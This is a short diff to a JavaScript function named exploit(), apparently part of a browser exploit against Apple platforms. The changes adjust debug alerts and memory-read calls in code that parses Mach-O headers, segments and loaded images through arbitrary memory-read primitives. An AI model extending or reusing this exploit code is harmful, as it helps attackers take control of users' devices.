@@ -597,8 +597,8 @@ function exploit(){
 }
         alert('Mach-O magic' + memory.u32(hdr))
         var base_seg = null;
-        alert("nsegs test" + memory.read_i32(hdr+0x14))
-        var nsegs    = memory.read_i32(hdr+0x14) //memory.u32(Add(hdr, 0x14));
+       // alert("nsegs test" + memory.read_i32(hdr+0x14))
+        var nsegs    = memory.u32(Add(hdr, 0x14));
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
         for(var i = 0; i < nsegs; ++i)
@@ -713,7 +713,7 @@ function exploit(){
         {
         
            // var m = i * 0x20;
-            alert(memory.u32(Add(Add(imgs,i * 0x20 + 0x18))))
+            alert(memory.u32(Add(imgs,i * 0x20 + 0x18)))
             var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x18)));
             var fn = function(i)
             {
